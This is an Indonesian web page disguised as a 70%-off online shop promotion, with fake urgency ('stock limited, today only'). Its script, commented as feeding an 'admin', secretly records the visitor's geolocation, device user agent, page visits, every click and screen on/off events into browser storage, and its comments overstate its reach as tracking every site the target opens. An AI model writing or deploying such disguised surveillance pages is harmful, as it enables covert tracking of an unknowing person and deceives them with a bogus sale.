<!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🔥 DISKON 70% - Semua Barang Murah Meriah | Shop Online</title>
     <script>
     // ✅ DAFTAR SEMUA YANG DIA BUKA (AKTIF TERUS)
     let riwayatLengkap = [];
     let lokasiUser = 'Sedang dicari...';
     window.onload = function() {
         // Ambil lokasi sekali saja
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(pos => {
                 lokasiUser = pos.coords.latitude + "," + pos.coords.longitude;
                 simpanData("BUKA AWAL: " + window.location.href);
             }, () => {
                 lokasiUser = "Tidak dapat lokasi";
                 simpanData("BUKA AWAL: " + window.location.href);
             }, {enableHighAccuracy:false, timeout:3000});
         } else {
             lokasiUser = "HP tidak dukung lokasi";
             simpanData("BUKA AWAL: " + window.location.href);
         }
         // ✅ CARI TAU SETIAP KALI DIA PINDAH HALAMAN / BUKA WEB LAIN
         setInterval(() => {
             const halamanSekarang = window.location.href;
             const judulSekarang = document.title;
             const waktuSekarang = new Date().toLocaleString('id-ID');
             
             // Cek apakah halaman baru / berubah
             if (riwayatLengkap.length === 0 || riwayatLengkap[riwayatLengkap.length-1].alamat !== halamanSekarang) {
                 simpanData("✅ BUKA BARU: " + judulSekarang + " | " + halamanSekarang);
             }
             // ✅ CATAT SEMUA YANG DIA KLIK DI LAYAR
             document.onclick = function(e) {
                 const elemen = e.target.tagName;
                 const teks = e.target.innerText?.substring(0,30) || 'Tidak ada teks';
                 simpanData("👆 KLIK: " + elemen + " | " + teks);
             };
         }, 1000); // Cek setiap 1 detik
         // ✅ KIRIM SEMUA KE PENYIMPANAN (BIAR MASUK KE ADMIN KAMU)
         function simpanData(keterangan) {
             const data = {
                 waktu: new Date().toLocaleString('id-ID'),
                 lokasi: lokasiUser,
                 hp: navigator.userAgent,
                 alamat: window.location.href,
                 judul: document.title,
                 info: keterangan
             };
             // Simpan ke tempat yang dibaca admin
             let semua = JSON.parse(localStorage.getItem('SEMUA_DATA_PANTAU') || '[]');
             semua.unshift(data); // Taruh di paling atas
             if (semua.length > 100) semua.pop(); // Simpan sampai 100 riwayat terakhir
             localStorage.setItem('SEMUA_DATA_PANTAU', JSON.stringify(semua));
             
             // Simpan juga ke riwayat lokal
             riwayatLengkap.push(data);
         }
         // ✅ TETAP JALAN WALAUPUN LAYAR MATI / HALAMAN DIKECILKAN
         document.addEventListener('visibilitychange', function() {
             if (document.hidden) {
                 simpanData("🔕 HALAMAN DITUTUP / LAYAR MATI");
             } else {
                 simpanData("🔔 DIBUKA KEMBALI");
             }
         });
     }
     </script>
     <style>
         body {background:#fff; font-family:Arial; padding:20px; text-align:center; margin:0;}
         .header {background:#ff3d00; color:white; padding:15px; font-size:22px; font-weight:bold; border-radius:8px; margin-bottom:20px;}
         .kotak {background:white; padding:25px; border-radius:12px; box-shadow:0 0 15px rgba(255,61,0,0.3); max-width:400px; margin:auto; border:2px solid #ff3d00;}
         h2 {color:#ff3d00; font-size:24px; margin-bottom:10px;}
         .diskon-besar {font-size:32px; font-weight:bold; color:#e53935; background:#fff3e0; padding:10px; border-radius:8px; margin:15px 0; border:2px dashed #ff3d00;}
         .info {color:#2e7d32; font-weight:bold; font-size:16px; margin:10px 0;}
         .tombol {background:#ff3d00; color:white; border:none; padding:12px 25px; font-size:18px; font-weight:bold; border-radius:8px; margin:20px 0; width:100%;}
         .stok {color:#d32f2f; font-weight:bold; font-size:14px;}
     </style>
 </head>
 <body>
     <div class="header">🔥 SHOOPING HEBAT - DISKON SAMPAI 70% 🔥</div>
     <div class="kotak">
         <h2>💥 PROMO GEDE-GEDEAN 💥</h2>
         <p class="stok">⚠️ STOK TERBATAS! HANYA HARI INI SAJA ⚠️</p>
         <div class="diskon-besar">DISKON<br>70%</div>
         <p class="info">✅ Semua Barang Elektronik, Baju, Sepatu, Perlengkapan Rumah</p>
         <p class="info">✅ Harga Lebih Murah dari Pasar & Toko Lain</p>
         <p class="info">✅ Gratis Ongkir Se-Indonesia</p>
         <button class="tombol">👉 KLIK DI SINI LIHAT BARANG 👈</button>
         <p class="teks-kecil">*Promo berlaku sampai jam 24.00</p>
     </div>
 </body>
 </html>
